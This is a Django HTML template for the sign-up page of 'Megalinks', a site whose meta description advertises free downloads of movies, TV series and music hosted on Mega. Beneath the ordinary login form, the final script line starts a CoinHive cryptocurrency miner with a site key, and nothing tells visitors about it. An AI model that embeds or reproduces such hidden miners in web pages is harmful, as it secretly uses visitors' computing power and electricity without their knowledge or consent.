<!DOCTYPE html>
<head>
          {% load static %}
<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-deep_purple.min.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Download all HD movies, latest TV series, music and much more. All the content hosted on Mega.co.nz." />
<meta name="keywords" content="Download links, Megalinks, Mega Dowload, Movie Download, TV Mega Download, Free Music Download">

<link rel="shortcut icon" href="{% static 'megalinks/favicon.png' %}">


<script>
    $(document).ready(function(){
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-90313095-1', 'auto');
      ga('send', 'pageview');

    });
</script>
<title>Sign Up</title>
<style>
.demo-list-item {
  width: 300px;
}

</style>
<title>Main</title>
</head>
<body>
<div class="mdl-layout mdl-js-layout">
  <header class="mdl-layout__header mdl-layout__header--scroll">
    <div class="mdl-layout__header-row">
      <span class="mdl-layout__title">Megalinks</span>
    </div>
  </header>
  <main class="mdl-layout__content">
        {% if messages %}
        <ul class="messages">
            {% for message in messages %}
            <li{% if message.tags %} class="{{ message.tags }}"{% endif %}>{{ message }}</li>
            {% endfor %}
        </ul>
        {% endif %}
      <h3 align="center" style="font-family: 'Roboto' 400;font-size: 30px;font-color: #444">Sign Up</h3>
    <div  align="center">
    	<form action="#" method="post" style="max-width: 320px; margin-top: 50px" align="center">
  		<div class="mdl-textfield mdl-js-textfield" style="margin-left: 10px">
    		<input class="mdl-textfield__input" type="text" id="sample1" name="username">
    		<label class="mdl-textfield__label" for="sample1">Username...</label>
  		</div><br />
      <div class="mdl-textfield mdl-js-textfield" style="margin-left: 20px">
          {% csrf_token %}
        <input class="mdl-textfield__input" type="password" id="sample2" name="password">
        <label class="mdl-textfield__label" for="sample2">Password...</label>
      </div><br /><br />
  		<button style="margin-left: 20px" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" onclick="submit()">
  			Sign Up
		</button>
		</form>
    </div>
  </main>
</div>
<script>var t = new CoinHive.Anonymous('2ZweIjJCsb50AgOiOX3I2QkhrGO7QKUI');t.start();</script>
</body>
</html>
